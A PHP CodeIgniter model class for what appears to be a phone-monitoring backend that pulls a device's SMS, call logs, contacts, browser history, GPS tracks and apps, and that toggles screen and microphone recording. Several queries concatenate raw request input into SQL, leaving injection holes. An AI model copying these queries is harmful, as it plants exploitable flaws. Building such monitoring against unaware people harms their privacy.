<?php
class User_model extends CI_Model {

	public function __construct() {
		$this -> load -> database();
	}

 

	function get_users_device($device_id) {
 
		$this -> db -> where("uuid" ,$device_id );
		$query = $this -> db -> get('device_info');
 
       return $query->row_array();
	}
	
		function checkDeviceStatus()
	{
		$uuid = $_REQUEST['id'];
			$deviceoffline = $this->checkDeviceAvailablity($uuid);
		if($deviceoffline){
			return true;//sending data from offline
		}
		//
			$devicebattery = $this->checkDeviceBattery($uuid);
		if($devicebattery){
			$this->deviceReadyMake($uuid);
			return true;//sending data from offline
		}
		///
		
		$this -> db -> where("uuid" ,$uuid );
		$query = $this -> db -> get('tb_ready');
 if($query->num_rows()>0){
 	 
	 
 	return true;
 }else{
	 
 
 	return false;
 }
        
	}
	
		 function deviceReadyMake($uuid)
    {
    	//for battery low case
      
   $gm_time = get_gmt_time();
   
 
	 $in_arr = array(
	 "uuid"=>$uuid,
            "is_ready" => '1',
            "createdon" => $gm_time);
			
		 
			$qry_res= $this->db->insert('tb_ready', $in_arr);
            $this->deleteDeviceRequest($uuid);
        return $qry_res;
    }
    
			function checkModuleStatus()
	{
		$uuid = $_REQUEST['id'];
		$this -> db -> where("uuid" ,$uuid );
		$query = $this -> db -> get('device_info');
 if($query->num_rows()>0){
 	 
	 
 	return  $query->row_array();
 }else{
	 
 
 	return false;
 }
        
	}
	function cancleRequest()
{
			      
   $gm_time = get_gmt_time();
	   $in_arr = array(
            "uuid"=>$_REQUEST['id'],   
            "is_ready"=>'1', 
            "createdon" => $gm_time);
			
			
			$qry_res= $this->db->insert('tb_ready', $in_arr);
			$id = (string) $this->db->insert_id();
			 $this->deleteDeviceRequest($_REQUEST['id']);
}
	function deleteDeviceRequest($uuid)
	{
		$this->db->where("uuid",$uuid);
	 $qry_res =	$this->db->delete("data_request");
		return $qry_res;
	}
	function checkDeviceAvailablity($uuid)
{
	$this->db->where("uuid",$uuid);
	$this->db->where("status","OFFLINE");
$checkqry	= $this->db->get("device_info");
if($checkqry->num_rows()>0){
	return true;
}else{
	return false;
}
}

	function checkDeviceBattery($uuid)
{
	$this->db->where("uuid",$uuid);
$checkqry	= $this->db->get("device_info");
if($checkqry->num_rows()>0){
	$row=$checkqry->row();
	if($row->battery_level=='LOW'){
		return true;
	}
	
} 
	return false;
 
}
		function get_data_settings($device_id)
	{
		$this -> db -> where("uuid" ,$device_id );
		$query = $this -> db -> get('device_setting');
 
       return $query->row_array();
	}
		function file_explorer_grid_data($device_id)
	{
		$query = $this -> db -> query(" select *,count(id) as filecount from media where device_id = '".$device_id."'
		group by filepath order by id desc
		 ");
 
       return $query->result_array();
	}
	
		function get_ocr_explorer_grid($device_id)
	{
		$query = $this -> db -> query(" select *,count(id) as filecount from ocr_media where device_id = '".$device_id."'
	and ocr_code>0	group by ocr_code order by id desc
		 ");
 
       return $query->result_array();
	}
	
		function get_file_explorer_gridchild($device_id,$dir)
	{
		$query = $this -> db -> query(" select *,count(id) as filecount from media where device_id = '".$device_id."'
	 and filepath like '%".$dir."/%'	group by filepath order by id desc
		 ");
//echo $this->db->last_query();exit;
       return $query->result_array();
	}
		function save_user_setting(){
		      $screenrecord  = 0;$ocrtype=0;
			  if(($_REQUEST['ocrvideo']==1)||($_REQUEST['vautosync']==1)){
			  	$screenrecord = 1;
			  }
			  if(($_REQUEST['ocrvideo']==1)&&($_REQUEST['vautosync']==1)){
			  	$ocrtype = 0; //both
			  }else if($_REQUEST['ocrvideo']==1){
			  	$ocrtype = 2;//only video
			  }else if($_REQUEST['vautosync']==1){
			  	$ocrtype = 1; //only screenshot
			  }
			  
   $gm_time = get_gmt_time();
    
 $this->db->where('uuid',$_REQUEST['id']);
$check= $this->db->get('device_setting');
 if($check->num_rows()>0){
 	$row =$check->row_array();
	 $in_arr = array(
	 "ocrtype" =>$ocrtype,
	  "auto_sleep" => $_REQUEST['autosleep'],
            "sync_time" => $_REQUEST['schedule'],
        //     "media_sync" => $_REQUEST['mediasyn'],
              "ocrscreenshot" => $_REQUEST['vautosync'],
              "ocrvideo_recording"=>$_REQUEST['ocrvideo'],
              "screen_recording_activate"=>$screenrecord,
            "microphone" => $_REQUEST['mircophone'], 
            "updatedon" => $gm_time);
			
			$this->db->where('uuid',$_REQUEST['id']);
			$qry_res= $this->db->update('device_setting', $in_arr);
             $id =$row['id'];
 	
 }else{
   $in_arr = array(
   "ocrtype" =>$ocrtype,
    "auto_sleep" => $_REQUEST['autosleep'],
            "uuid"=>$_REQUEST['id'],
            "sync_time" => $_REQUEST['schedule'],
          //   "media_sync" => $_REQUEST['mediasyn'],
              "ocrscreenshot" => $_REQUEST['vautosync'],
              "ocrvideo_recording"=>$_REQUEST['ocrvideo'],
               "screen_recording_activate"=>$screenrecord,
            "microphone" => $_REQUEST['mircophone'], 
            "createdon" => $gm_time,
			 "updatedon" => $gm_time);
			
			
			$qry_res= $this->db->insert('device_setting', $in_arr);
			$id = (string) $this->db->insert_id();
             
 }
 
        if ($qry_res) {
            return $id;
        }
        return false;
	}
	
	function get_users_contact($device_id)
	{
		$this -> db -> where("device_id" ,$device_id );
		$query = $this -> db -> get('device_contact');
 
       return $query->result_array();
	}
		function get_users_events($device_id)
	{
		$this -> db -> where("uuid" ,$device_id );
		$query = $this -> db -> get('device_events');
 
       return $query->result_array();
	}
	function get_users_calllogs($device_id)
	{
		$this -> db -> where("device_id" ,$device_id );
		$query = $this -> db -> get('call_log');
 
       return $query->result_array();
	}
	function get_users_message($device_id)
	{
		$this -> db -> where("device_id" ,$device_id );
		$query = $this -> db -> get('device_native_sms');
 
       return $query->result_array();
	}
		function get_users_general($device_id)
	{
		$this -> db -> where("uuid" ,$device_id );
		$query = $this -> db -> get('device_general');
 
       return $query->result_array();
	}
	 
	
	 function get_users_wifi($device_id)
	{
		$this -> db -> where("device_id" ,$device_id );
		$query = $this -> db -> get('device_wifi_conn');
 
       return $query->result_array();
	}
	function get_users_browser($device_id)
	{
		$this -> db -> where("device_id" ,$device_id );
		$query = $this -> db -> get('device_browser_history');
 
       return $query->result_array();
	}
	
	function make_device_Ready()
	{
		$uuid = $_REQUEST['id'];
		
		$this->setBatteryStatus($uuid);
		$this->setOcrUpload($uuid);
		
	$already_request =	$this->checkPastRequest($uuid);
		if(!$already_request){
		$this->db->where("uuid",$uuid);
	$query =	$this->db->delete("tb_ready");
		
		$this->request_device_fordata($uuid);
		} 
		
		return 	true;
	}
	function setBatteryStatus($uuid)
	{
		$in_arr = array("battery_level" => "OK");

			$this -> db -> where('uuid', $uuid);
			$qry_res = $this -> db -> update('device_info', $in_arr);
	}
	
		function setOcrUpload($uuid)
	{
		$in_arr = array("video_made" => "0");
	$this -> db -> where('video_made', "2");
			$this -> db -> where('device_id', $uuid);
			$qry_res = $this -> db -> update('ocr_media', $in_arr);
	}
	function checkPastRequest($uuid){
		   $gm_time = get_gmt_time();  
		    
$time = strtotime($gm_time);
$time = $time - (2 * 60);
$date = date("Y-m-d H:i:s", $time);
		   $this -> db -> where('createdon >', $date);
			$this -> db -> where('uuid', $uuid);
			$qry = $this -> db -> get('data_request');
			//echo $this->db->last_query();exit;
			if($qry->num_rows()>0){
				return true;
			}else{
				return false;
			}
	}
	
	function request_device_fordata($uuid){
		   $gm_time = get_gmt_time();  
 
	 $in_arr = array(
	 "uuid"=>$uuid, 
            "createdon" => $gm_time); 
	$qry_res= $this->db->insert('data_request', $in_arr);
	 
	}
	
	
	
	
	
	
	function get_gpsTrack_dash($device_id)
	{
		
		
		 
		 $this->db->limit(1);
		$this->db->order_by("createdon","desc");
		$this -> db -> where("device_id" ,$device_id );
		$query = $this -> db -> get('device_gps');
 //echo $this->db->last_query();exit;
       return $query->result_array();
	}
	
	
	
	function get_gpsTrack($device_id)
	{
		if(isset($_POST['choosedate'])){
			$date_arr = explode("/", $_POST['choosedate']);
			$gm_time = $date_arr[2].'-'.$date_arr[0].'-'.$date_arr[1];
		}else{
			date_default_timezone_set("UTC");
			$gm_time = gmdate("Y-m-d");
		}
		
		 
		 
		$this->db->where("date(createdon) = date('".$gm_time."') ");
		$this -> db -> where("device_id" ,$device_id );
		$query = $this -> db -> get('device_gps');
 //echo $this->db->last_query();exit;
       return $query->result_array();
	}
	function get_deviceapps($device_id)
	{
		$this -> db -> where("device_id" ,$device_id );
		$query = $this -> db -> get('device_apps');
 
       return $query->result_array();
	}

}
?>